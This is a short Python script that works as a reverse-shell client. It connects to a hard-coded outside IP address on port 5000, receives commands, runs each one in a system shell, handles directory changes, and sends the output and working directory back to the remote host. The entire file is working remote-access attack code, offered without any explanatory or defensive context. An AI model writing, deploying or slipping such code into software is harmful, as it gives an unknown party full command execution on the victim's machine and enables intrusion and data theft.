import socket
import os
import subprocess

HOST = '157.245.34.67'
PORT = 5000
client_socket = socket.socket()
client_socket.connect((HOST,PORT))

while True:
    data = client_socket.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = command.stdout.read() + command.stderr.read()
        output_str = output_bytes.decode("utf-8", "ignore")
        client_socket.send(str.encode(output_str + '\n' + str(os.getcwd()) + '> ', "utf-8"))
        #print(output_str)

client_socket.close()